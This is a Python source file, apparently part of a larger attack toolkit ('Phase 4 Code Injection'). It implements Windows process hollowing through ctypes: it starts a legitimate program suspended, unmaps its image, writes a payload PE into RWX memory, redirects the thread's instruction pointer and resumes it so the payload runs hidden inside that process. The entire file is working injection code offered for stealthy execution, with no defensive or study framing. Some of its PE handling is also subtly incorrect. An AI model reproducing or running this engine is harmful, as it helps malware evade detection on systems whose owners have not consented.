#!/usr/bin/env python3
"""
Process Hollowing Engine - Phase 4 Code Injection
Injects payload into suspended processes to achieve stealth execution
Technique: CreateProcessA + SuspendThread + UnmapViewOfSection + WriteProcessMemory
"""

import ctypes
import ctypes.wintypes as wt
import struct
import logging
import platform
import subprocess
from pathlib import Path
from typing import Optional, Tuple, Dict, Any
from dataclasses import dataclass

logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(message)s')
log = logging.getLogger("ProcessHollowing")

# Windows constants
CREATE_SUSPENDED = 0x00000004
PROCESS_ALL_ACCESS = 0x001F0FFF
THREAD_ALL_ACCESS = 0x001F03FF
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_EXECUTE_READWRITE = 0x40

# Detect host architecture once
IS_64BIT_PROCESS = platform.machine().endswith('64') or ctypes.sizeof(ctypes.c_void_p) == 8

# ---------------------------------------------------------------------------
# Windows API structures
# ---------------------------------------------------------------------------
class STARTUPINFOA(ctypes.Structure):
    _fields_ = [
        ("cb", ctypes.c_ulong),
        ("lpReserved", ctypes.c_char_p),
        ("lpDesktop", ctypes.c_char_p),
        ("lpTitle", ctypes.c_char_p),
        ("dwX", ctypes.c_ulong),
        ("dwY", ctypes.c_ulong),
        ("dwXSize", ctypes.c_ulong),
        ("dwYSize", ctypes.c_ulong),
        ("dwXCountChars", ctypes.c_ulong),
        ("dwYCountChars", ctypes.c_ulong),
        ("dwFillAttribute", ctypes.c_ulong),
        ("dwFlags", ctypes.c_ulong),
        ("wShowWindow", ctypes.c_ushort),
        ("cbReserved2", ctypes.c_ushort),
        ("lpReserved2", ctypes.c_char_p),
        ("hStdInput", ctypes.c_void_p),
        ("hStdOutput", ctypes.c_void_p),
        ("hStdError", ctypes.c_void_p),
    ]


class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("hProcess", ctypes.c_void_p),
        ("hThread", ctypes.c_void_p),
        ("dwProcessId", ctypes.c_ulong),
        ("dwThreadId", ctypes.c_ulong),
    ]


# 32-bit CONTEXT (x86 target / WOW64)
class CONTEXT(ctypes.Structure):
    _fields_ = [
        ("ContextFlags", ctypes.c_ulong),
        ("Eax", ctypes.c_ulong),
        ("Ecx", ctypes.c_ulong),
        ("Edx", ctypes.c_ulong),
        ("Ebx", ctypes.c_ulong),
        ("Esp", ctypes.c_ulong),
        ("Ebp", ctypes.c_ulong),
        ("Esi", ctypes.c_ulong),
        ("Edi", ctypes.c_ulong),
        ("SegGs", ctypes.c_ulong),
        ("SegFs", ctypes.c_ulong),
        ("SegEs", ctypes.c_ulong),
        ("SegDs", ctypes.c_ulong),
        ("SegCs", ctypes.c_ulong),
        ("SegSs", ctypes.c_ulong),
        ("EFlags", ctypes.c_ulong),
        ("Eip", ctypes.c_ulong),
        ("ExtendedRegisters", ctypes.c_ubyte * 512),
    ]


# 64-bit CONTEXT (x64 native target)
# Must be 16-byte aligned — use _pack_ = 16 and align the struct.
class M128A(ctypes.Structure):
    _fields_ = [("Low", ctypes.c_ulonglong), ("High", ctypes.c_longlong)]

class CONTEXT64(ctypes.Structure):
    """Full x64 CONTEXT structure (winnt.h). Size must be exactly 1232 bytes."""
    _pack_ = 16
    _fields_ = [
        # Control registers
        ("P1Home",          ctypes.c_ulonglong),
        ("P2Home",          ctypes.c_ulonglong),
        ("P3Home",          ctypes.c_ulonglong),
        ("P4Home",          ctypes.c_ulonglong),
        ("P5Home",          ctypes.c_ulonglong),
        ("P6Home",          ctypes.c_ulonglong),
        # Context flags + debug
        ("ContextFlags",    ctypes.c_ulong),
        ("MxCsr",           ctypes.c_ulong),
        # Segment and processor flags
        ("SegCs",           ctypes.c_ushort),
        ("SegDs",           ctypes.c_ushort),
        ("SegEs",           ctypes.c_ushort),
        ("SegFs",           ctypes.c_ushort),
        ("SegGs",           ctypes.c_ushort),
        ("SegSs",           ctypes.c_ushort),
        ("EFlags",          ctypes.c_ulong),
        # Debug registers
        ("Dr0",             ctypes.c_ulonglong),
        ("Dr1",             ctypes.c_ulonglong),
        ("Dr2",             ctypes.c_ulonglong),
        ("Dr3",             ctypes.c_ulonglong),
        ("Dr6",             ctypes.c_ulonglong),
        ("Dr7",             ctypes.c_ulonglong),
        # Integer registers
        ("Rax",             ctypes.c_ulonglong),
        ("Rcx",             ctypes.c_ulonglong),
        ("Rdx",             ctypes.c_ulonglong),
        ("Rbx",             ctypes.c_ulonglong),
        ("Rsp",             ctypes.c_ulonglong),
        ("Rbp",             ctypes.c_ulonglong),
        ("Rsi",             ctypes.c_ulonglong),
        ("Rdi",             ctypes.c_ulonglong),
        ("R8",              ctypes.c_ulonglong),
        ("R9",              ctypes.c_ulonglong),
        ("R10",             ctypes.c_ulonglong),
        ("R11",             ctypes.c_ulonglong),
        ("R12",             ctypes.c_ulonglong),
        ("R13",             ctypes.c_ulonglong),
        ("R14",             ctypes.c_ulonglong),
        ("R15",             ctypes.c_ulonglong),
        # Program counter
        ("Rip",             ctypes.c_ulonglong),
        # Floating point / XMM
        ("FltSave",         ctypes.c_ubyte * 512),
        # Vector registers
        ("VectorRegister",  M128A * 26),
        ("VectorControl",   ctypes.c_ulonglong),
        # Debug control
        ("DebugControl",    ctypes.c_ulonglong),
        ("LastBranchToRip", ctypes.c_ulonglong),
        ("LastBranchFromRip", ctypes.c_ulonglong),
        ("LastExceptionToRip", ctypes.c_ulonglong),
        ("LastExceptionFromRip", ctypes.c_ulonglong),
    ]

# PROCESS_BASIC_INFORMATION — proper x64 layout (all fields are pointer-sized)
class PROCESS_BASIC_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("ExitStatus",                   ctypes.c_ulonglong),
        ("PebBaseAddress",               ctypes.c_ulonglong),
        ("AffinityMask",                 ctypes.c_ulonglong),
        ("BasePriority",                 ctypes.c_ulonglong),
        ("UniqueProcessId",              ctypes.c_ulonglong),
        ("InheritedFromUniqueProcessId", ctypes.c_ulonglong),
    ]


@dataclass
class InjectionResult:
    """Result of code injection attempt"""
    success: bool
    process_id: Optional[int]
    thread_id: Optional[int]
    payload_address: Optional[int]
    error_message: Optional[str]
    injection_method: str  # "process_hollowing", "dll_injection", etc.


class ProcessHollowingEngine:
    """
    Windows Process Hollowing Implementation — x86/x64 adaptive

    Technique:
    1. Create process in suspended state (target_process.exe)
    2. Read PEB.ImageBase via NtQueryInformationProcess → get current image base
    3. NtUnmapViewOfSection → hollow out the original image
    4. VirtualAllocEx at same base address (or let OS pick)
    5. Write payload PE into allocated memory
    6. Update thread context Rip/Eip to payload entry point
    7. Resume thread (executes payload inside legitimate process shell)

    x64-aware: Uses CONTEXT64 on 64-bit hosts, CONTEXT on 32-bit / WOW64.
    """

    def __init__(self):
        self.kernel32 = ctypes.WinDLL("kernel32", use_errno=True)
        self.ntdll = ctypes.WinDLL("ntdll", use_errno=True)
        self.successful_injections: list[InjectionResult] = []

        # Wire NtQueryInformationProcess return type
        self.ntdll.NtQueryInformationProcess.restype = ctypes.c_long
        self.ntdll.NtQueryInformationProcess.argtypes = [
            ctypes.c_void_p,   # ProcessHandle
            ctypes.c_ulong,    # ProcessInformationClass
            ctypes.c_void_p,   # ProcessInformation
            ctypes.c_ulong,    # ProcessInformationLength
            ctypes.POINTER(ctypes.c_ulong),  # ReturnLength
        ]
        # Wire NtUnmapViewOfSection
        self.ntdll.NtUnmapViewOfSection.restype = ctypes.c_long
        self.ntdll.NtUnmapViewOfSection.argtypes = [
            ctypes.c_void_p,  # ProcessHandle
            ctypes.c_void_p,  # BaseAddress
        ]

    # ------------------------------------------------------------------
    def _get_peb_image_base(self, process_handle) -> Optional[int]:
        """
        Read PEB.ImageBase from a remote process via NtQueryInformationProcess.
        Returns the image base address (int) or None on failure.
        """
        pbi = PROCESS_BASIC_INFORMATION()
        ret_len = ctypes.c_ulong(0)
        pbi_size = ctypes.sizeof(pbi)  # 48 on x64

        status = self.ntdll.NtQueryInformationProcess(
            process_handle,
            0,                           # ProcessBasicInformation
            ctypes.byref(pbi),
            pbi_size,
            ctypes.byref(ret_len),
        )
        if status != 0:
            log.error(f"NtQueryInformationProcess failed: status=0x{status & 0xFFFFFFFF:08x}")
            return None

        peb_base = pbi.PebBaseAddress
        if not peb_base:
            log.error("PEB base address is NULL")
            return None

        log.debug(f"PEB base: 0x{peb_base:016x}")

        # Read PEB.ImageBaseAddress at offset 0x10 (x64) / 0x08 (x86)
        image_base_offset = 0x10 if IS_64BIT_PROCESS else 0x08
        image_base_ptr = peb_base + image_base_offset

        if IS_64BIT_PROCESS:
            image_base_buf = (ctypes.c_ulonglong * 1)()
            read_size = 8
        else:
            image_base_buf = (ctypes.c_ulong * 1)()
            read_size = 4

        bytes_read = ctypes.c_ulong(0)
        ok = self.kernel32.ReadProcessMemory(
            process_handle,
            ctypes.c_void_p(image_base_ptr),
            image_base_buf,
            read_size,
            ctypes.byref(bytes_read),
        )
        if not ok:
            log.error("ReadProcessMemory(PEB.ImageBase) failed")
            return None

        image_base = image_base_buf[0]
        log.debug(f"PEB.ImageBase = 0x{image_base:016x}")
        return image_base

    # ------------------------------------------------------------------
    def _get_thread_context(self, thread_handle):
        """
        Get the suspended thread context. Returns a CONTEXT64 on x64 or
        CONTEXT on x86/WOW64 hosts. The returned object exposes .Rip/.Eip.
        """
        if IS_64BIT_PROCESS:
            ctx = CONTEXT64()
            # CONTEXT_AMD64 (0x00100000) | CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS
            ctx.ContextFlags = 0x00100007
            result = self.kernel32.GetThreadContext(thread_handle, ctypes.byref(ctx))
        else:
            ctx = CONTEXT()
            ctx.ContextFlags = 0x00010007  # CONTEXT_ALL (x86)
            result = self.kernel32.GetThreadContext(thread_handle, ctypes.byref(ctx))

        if result:
            if IS_64BIT_PROCESS:
                log.debug(f"Thread context x64: Rip=0x{ctx.Rip:016x}")
            else:
                log.debug(f"Thread context x86: Eip=0x{ctx.Eip:08x}")
            return ctx
        else:
            log.error(f"GetThreadContext failed: errno={ctypes.get_errno()}")
            return None

    # ------------------------------------------------------------------
    def _set_thread_context(self, thread_handle, ctx) -> bool:
        """Set context (works for both CONTEXT and CONTEXT64)."""
        result = self.kernel32.SetThreadContext(thread_handle, ctypes.byref(ctx))
        return bool(result)

    def hollow_process(self, target_process: str, payload_path: str,
                      cleanup_target: bool = True) -> InjectionResult:
        """
        Perform process hollowing injection.

        Args:
            target_process: Path to legitimate process (e.g., C:\\Windows\\System32\\notepad.exe)
            payload_path: Path to PE payload to inject
            cleanup_target: Whether to terminate original process on failure

        Returns:
            InjectionResult with success status and details
        """
        try:
            # Step 1: Read payload from disk
            if not Path(payload_path).exists():
                return InjectionResult(
                    success=False,
                    process_id=None,
                    thread_id=None,
                    payload_address=None,
                    error_message=f"Payload not found: {payload_path}",
                    injection_method="process_hollowing"
                )

            payload_data = Path(payload_path).read_bytes()
            log.info(f"📦 Loaded payload: {len(payload_data)} bytes")

            # Step 2: Create target process in suspended state
            log.info(f"🔄 Creating target process in suspended state: {target_process}")
            pi, si = self._create_suspended_process(target_process)

            if not pi:
                return InjectionResult(
                    success=False,
                    process_id=None,
                    thread_id=None,
                    payload_address=None,
                    error_message="Failed to create suspended process",
                    injection_method="process_hollowing"
                )

            log.info(f"✅ Created suspended process: PID={pi.dwProcessId}, TID={pi.dwThreadId}")

            # Step 3: Get thread context (x64 or x86)
            ctx = self._get_thread_context(pi.hThread)
            if not ctx:
                self.kernel32.TerminateProcess(pi.hProcess, 1)
                return InjectionResult(
                    success=False,
                    process_id=pi.dwProcessId,
                    thread_id=pi.dwThreadId,
                    payload_address=None,
                    error_message="Failed to get thread context",
                    injection_method="process_hollowing"
                )

            # Step 4: Read PEB.ImageBase from the suspended process
            image_base = self._get_peb_image_base(pi.hProcess)
            if image_base is None:
                log.warning("⚠️  PEB.ImageBase read failed — will let OS choose allocation address")
                image_base = 0  # fall through; VirtualAllocEx with None

            # Step 5: Parse payload PE header to get entry point RVA
            entry_point_rva = self._parse_pe_entry_point(payload_data)
            if entry_point_rva is None:
                self.kernel32.TerminateProcess(pi.hProcess, 1)
                return InjectionResult(
                    success=False,
                    process_id=pi.dwProcessId,
                    thread_id=pi.dwThreadId,
                    payload_address=None,
                    error_message="Failed to parse PE header",
                    injection_method="process_hollowing"
                )

            log.info(f"📍 Payload entry point RVA: 0x{entry_point_rva:08x}")

            # Step 6: NtUnmapViewOfSection — hollow the original image
            if image_base:
                log.info(f"🪓 Unmapping original image at 0x{image_base:016x}")
                unmap_status = self.ntdll.NtUnmapViewOfSection(
                    pi.hProcess,
                    ctypes.c_void_p(image_base),
                )
                if unmap_status != 0:
                    log.warning(f"⚠️  NtUnmapViewOfSection returned 0x{unmap_status & 0xFFFFFFFF:08x} (non-fatal, continuing)")

            # Step 7: Allocate memory for payload at original base (or any address)
            preferred_base = ctypes.c_void_p(image_base) if image_base else None
            log.info(f"💾 Allocating {len(payload_data)} bytes")

            allocated_addr = self.kernel32.VirtualAllocEx(
                pi.hProcess,
                preferred_base,
                len(payload_data),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE
            )

            if not allocated_addr:
                log.warning("⚠️  Preferred address allocation failed, retrying at system-chosen address")
                allocated_addr = self.kernel32.VirtualAllocEx(
                    pi.hProcess,
                    None,
                    len(payload_data),
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_EXECUTE_READWRITE
                )

            if not allocated_addr:
                self.kernel32.TerminateProcess(pi.hProcess, 1)
                return InjectionResult(
                    success=False,
                    process_id=pi.dwProcessId,
                    thread_id=pi.dwThreadId,
                    payload_address=None,
                    error_message="Failed to allocate memory in target process",
                    injection_method="process_hollowing"
                )

            log.info(f"✅ Allocated memory at 0x{allocated_addr:016x}")

            # Step 8: Write payload into allocated memory
            bytes_written = ctypes.c_ulong(0)
            result = self.kernel32.WriteProcessMemory(
                pi.hProcess,
                ctypes.c_void_p(allocated_addr),
                ctypes.c_char_p(payload_data),
                len(payload_data),
                ctypes.byref(bytes_written)
            )

            if not result or bytes_written.value != len(payload_data):
                self.kernel32.TerminateProcess(pi.hProcess, 1)
                return InjectionResult(
                    success=False,
                    process_id=pi.dwProcessId,
                    thread_id=pi.dwThreadId,
                    payload_address=allocated_addr,
                    error_message=f"Failed to write payload ({bytes_written.value}/{len(payload_data)} bytes)",
                    injection_method="process_hollowing"
                )

            log.info(f"✅ Wrote {bytes_written.value} bytes to target process")

            # Step 9: Update thread context entry point (Rip for x64, Eip for x86)
            new_entry_point = allocated_addr + entry_point_rva

            if IS_64BIT_PROCESS:
                ctx.Rip = new_entry_point
                log.info(f"🎯 Setting Rip → 0x{new_entry_point:016x}")
            else:
                ctx.Eip = new_entry_point
                log.info(f"🎯 Setting Eip → 0x{new_entry_point:08x}")

            if not self._set_thread_context(pi.hThread, ctx):
                self.kernel32.TerminateProcess(pi.hProcess, 1)
                return InjectionResult(
                    success=False,
                    process_id=pi.dwProcessId,
                    thread_id=pi.dwThreadId,
                    payload_address=allocated_addr,
                    error_message="Failed to set thread context",
                    injection_method="process_hollowing"
                )

            # Step 10: Resume thread → payload executes inside hollow shell
            log.info("▶️  Resuming thread to execute payload...")
            resume_count = self.kernel32.ResumeThread(pi.hThread)

            if resume_count == -1:
                self.kernel32.TerminateProcess(pi.hProcess, 1)
                return InjectionResult(
                    success=False,
                    process_id=pi.dwProcessId,
                    thread_id=pi.dwThreadId,
                    payload_address=allocated_addr,
                    error_message="Failed to resume thread",
                    injection_method="process_hollowing"
                )

            log.info("✅ Thread resumed successfully")

            self.kernel32.CloseHandle(pi.hProcess)
            self.kernel32.CloseHandle(pi.hThread)

            injection_result = InjectionResult(
                success=True,
                process_id=pi.dwProcessId,
                thread_id=pi.dwThreadId,
                payload_address=allocated_addr,
                error_message=None,
                injection_method="process_hollowing"
            )
            self.successful_injections.append(injection_result)
            log.info(f"🎉 Process hollowing successful: PID={pi.dwProcessId}")
            return injection_result

        except Exception as e:
            log.error(f"❌ Process hollowing error: {e}")
            return InjectionResult(
                success=False,
                process_id=None,
                thread_id=None,
                payload_address=None,
                error_message=str(e),
                injection_method="process_hollowing"
            )
    
    def _create_suspended_process(self, process_path: str) -> Tuple[Optional[PROCESS_INFORMATION], Optional[STARTUPINFOA]]:
        """Create process in suspended state"""
        try:
            si = STARTUPINFOA()
            si.cb = ctypes.sizeof(si)
            si.dwFlags = 0
            
            pi = PROCESS_INFORMATION()
            
            result = self.kernel32.CreateProcessA(
                ctypes.c_char_p(process_path.encode()),
                None,
                None,
                None,
                False,
                CREATE_SUSPENDED,
                None,
                None,
                ctypes.byref(si),
                ctypes.byref(pi)
            )
            
            if result:
                return pi, si
            else:
                log.error(f"CreateProcessA failed: {ctypes.get_errno()}")
                return None, None
                
        except Exception as e:
            log.error(f"Failed to create suspended process: {e}")
            return None, None
    
    def _parse_pe_entry_point(self, pe_data: bytes) -> Optional[int]:
        """Parse PE header to get entry point offset"""
        try:
            # Check MZ signature
            if pe_data[:2] != b'MZ':
                log.error("Invalid PE file: missing MZ signature")
                return None
            
            # Get PE header offset (at 0x3C)
            pe_offset = struct.unpack('<I', pe_data[0x3C:0x40])[0]
            
            # Check PE signature
            if pe_data[pe_offset:pe_offset+2] != b'PE':
                log.error("Invalid PE file: missing PE signature")
                return None
            
            # Get entry point offset (at 0x28 bytes after PE signature)
            entry_point = struct.unpack('<I', pe_data[pe_offset+0x28:pe_offset+0x2C])[0]
            
            return entry_point
            
        except Exception as e:
            log.error(f"Failed to parse PE header: {e}")
            return None


if __name__ == "__main__":
    engine = ProcessHollowingEngine()
    print("✅ Process Hollowing Engine initialized and ready for Phase 4 integration")
